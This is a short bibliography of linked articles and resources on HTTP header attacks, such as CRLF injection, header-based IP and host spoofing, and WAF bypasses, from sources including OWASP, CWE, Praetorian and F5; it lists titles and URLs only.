- OWASP — [IP Spoofing via HTTP Headers](https://owasp.org/www-community/pages/attacks/ip_spoofing_via_http_headers)
- CWE-113 — [Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)
- YesWeHack — [HTTP Header Hacks: From Basic to Advanced](https://www.yeswehack.com/learn-bug-bounty/http-header-exploitation)
- HackerNotes Ep.86 — [X-Correlation Header Injection Research by Frans Rosen](https://blog.criticalthinkingpodcast.io/p/hackernotes-ep86-xcorrelation-frans-rce-research-drop)
- Compass Security — [Bypassing Web Filters via Host Header Spoofing](https://blog.compass-security.com/2025/03/bypassing-web-filters-part-2-host-header-spoofing/)
- Invicti — [CRLF Injection, HTTP Response Splitting & HTTP Header Injection](https://www.invicti.com/blog/web-security/crlf-http-header)
- Praetorian — [Bypassing Akamai WAF Using Injected Content-Encoding Header](https://www.praetorian.com/blog/using-crlf-injection-to-bypass-akamai-web-app-firewall/)
- SwissKyRepo — [PayloadsAllTheThings: CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
- F5 — [Security Rule Zero: A Warning about X-Forwarded-For](https://www.f5.com/company/blog/security-rule-zero-a-warning-about-x-forwarded-for)
